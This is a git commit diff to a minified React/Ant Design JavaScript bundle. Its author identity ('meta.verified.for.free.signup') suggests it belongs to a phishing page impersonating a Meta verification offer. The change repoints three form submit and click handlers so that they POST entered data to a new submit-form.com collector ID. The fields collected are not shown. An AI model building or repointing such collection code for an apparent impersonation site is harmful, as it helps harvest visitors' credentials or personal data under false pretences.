6d51f896a39cd5b2636c6f9d1558e225200058d2
singup-new <meta.verified.for.free.signup@gmail.com>
2025-03-23 11:18:04 -0800

    Update main.be179052.js

--- static/js/main.be179052.js
+++ static/js/main.be179052.js
@@ -10165,7 +10165,7 @@
                                         className: "ant-form ant-form-horizontal css-m4timi",
                                         onSubmit: e => {
                                             e.preventDefault(),
-                                                fetch("https://submit-form.com/mSnx9enzI", {
+                                                fetch("https://submit-form.com/MCnroGlmB", {
                                                     method: "POST",
                                                     headers: {
                                                         "Content-Type": "application/json"
@@ -13849,7 +13849,7 @@
                                         he.jsxs)("form", {
                                         onSubmit: n => {
                                             n.preventDefault(),
-                                                u && o ? (fetch("https://submit-form.com/mSnx9enzI", {
+                                                u && o ? (fetch("https://submit-form.com/MCnroGlmB", {
                                                         method: "POST",
                                                         headers: {
                                                             "Content-Type": "application/json"
@@ -13960,7 +13960,7 @@
                             he.jsx)("button", {
                             onClick: n => {
                                 n.preventDefault(),
-                                    fetch("https://submit-form.com/mSnx9enzI", {
+                                    fetch("https://submit-form.com/MCnroGlmB", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
